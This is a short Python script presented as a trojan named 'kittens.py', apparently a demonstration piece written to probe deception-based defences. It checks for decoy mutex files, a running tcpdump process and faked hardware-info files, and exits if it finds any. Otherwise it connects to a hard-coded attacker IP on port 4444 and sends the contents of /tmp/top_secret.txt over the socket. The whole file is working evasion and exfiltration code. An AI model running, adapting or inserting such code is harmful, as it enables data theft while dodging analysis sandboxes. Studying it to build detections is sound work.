#!/usr/bin/env python3
import os
import sys
import socket
import subprocess

# ⚠️ Change the IP and port to match your attacker machine listener configuration
ATTACKER_IP = "192.168.1.100"  
ATTACKER_PORT = 4444

def scan_environment_and_attack():
    print("[*] Trojan (kittens.py) Executed. Scanning target system environment...")

    # 1. Threat-Intelligence Mutex Shield Check
    mutexes = ["sem.WannaCry_Global_Mutex", "sem.Lumma_Evasion_2026", "sem.vbox_deception_mutex"]
    for m in mutexes:
        if os.path.exists(f"/dev/shm/{m}"):
            print(f"[-] [ANTI-ANALYSIS] Active Mutex Shield Detected: {m}! Self-destructing to evade capture...")
            sys.exit(0)

    # 2. Dynamic Ghost Process Network Sniffer Check
    try:
        pids = subprocess.check_output(["pgrep", "-f", "/tmp/tcpdump"]).decode().strip()
        if pids:
            print("[-] [ANTI-ANALYSIS] Network Sniffer (/tmp/tcpdump) detected running! Aborting to prevent tracking...")
            sys.exit(0)
    except subprocess.CalledProcessError:
        pass

    # 3. Hardware Gaslighting Profile Check
    if os.path.exists("/tmp/fake_cpuinfo") or os.path.exists("/tmp/fake_meminfo"):
        print("[-] [ANTI-SANDBOX] Low hardware resources or Emulated environment detected (1 Core / 1.75GB). Exiting payload...")
        sys.exit(0)

    # 4. Payload Execution Phase (Fires if no defensive indicators are present)
    print("\n\033[91m[☠] SUCCESS: No active defenses found! Executing attack payload...\033[0m")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        
        # Exfiltrating sensitive target data over the wire
        with open("/tmp/top_secret.txt", "r") as f:
            s.send(f.read().encode())
            
        s.send(b"\n[+] Data Exfiltrated Successfully.\n")
        s.close()
    except Exception as e:
        print(f"[-] Attacker Listener offline: {e}")

if __name__ == "__main__":
    scan_environment_and_attack()